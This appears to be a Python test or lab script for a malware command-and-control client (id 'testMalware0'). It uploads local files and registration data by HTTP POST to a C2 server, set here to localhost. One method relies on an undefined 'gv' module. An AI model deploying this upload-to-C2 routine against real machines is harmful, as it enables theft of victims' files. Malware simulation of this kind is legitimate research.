import os
import requests

dirpath = os.path.dirname(__file__)

#-----------------------------------------------------------------------------
#-----------------------------------------------------------------------------
class c2Client(object):

    def __init__(self, c2Ipaddr, c2Port=5000) -> None:
        self.id = 'testMalware0'
        self.ipaddres = '127.0.0.1'
        self.c2Ipaddr = c2Ipaddr
        self.c2Port = c2Port
        self.urlDict = self.getUrlDict()

    #-----------------------------------------------------------------------------
    def getUrlDict(self):
        return {
            'postData': "http://%s:%s/dataPost/" % (self.c2Ipaddr, str(self.c2Port)),
            'postFile': "http://%s:%s/fileupload" % (self.c2Ipaddr, str(self.c2Port))
        }

    #-----------------------------------------------------------------------------
    def uploadfile(self, filePath, dataProcessFun=None):
        """ Upload a file which is smaller than the TCP max buffer size."""
        if os.path.exists(filePath):
            try:
                filename = os.path.basename(filePath)
                with open(filePath, 'rb') as fh:
                    filedata = fh.read() if dataProcessFun is None else dataProcessFun(fh.read())
                    uploadUrl = self.urlDict['postFile']
                    dataDict = {'file':(filename, filedata)}
                    res = self.postData(uploadUrl, dataDict, postfile=True)
                    return res
            except Exception as err:
                print("File IO error: %s" %str(err))
                return None
        else:
            print("Upload file : %s not exist" %str(filePath))
            return None

#-----------------------------------------------------------------------------
    def reportTohub(self):
        """ Report to the hub the schduler's inforamtion to register."""
        if not gv.RPT_MD: return None
        jsonDict = {
            'name': gv.OWN_ID,
            'ipAddr': gv.OWN_IP,
            'udpPort': gv.UDP_PORT,
            'report': gv.RPT_MD
        }
        reportUrl = "http://%s:%s/dataPost/" % (gv.HUB_IP, str(gv.HUB_PORT))
        reportUrl += str(jsonDict['name'])
        self.postData(reportUrl, jsonDict)

    #-----------------------------------------------------------------------------
    def postData(self, postUrl, jsonDict, postfile=False):
        try:
            res = requests.post(postUrl, files=jsonDict) if postfile else requests.post(postUrl, json=jsonDict)
            if res.ok: 
                print("http server reply: %s" %str(res.json()))
                return res.json()
            else:
                print("post error")
        except Exception as err:
            print("http server not reachable, error: %s" %str(err))
            return None

#-----------------------------------------------------------------------------
#-----------------------------------------------------------------------------
def main():
    client = c2Client('127.0.0.1', c2Port=5000)
    filePath = os.path.join(dirpath, 'update_installer.zip')
    client.uploadfile(filePath)

if __name__ == '__main__':
    main()
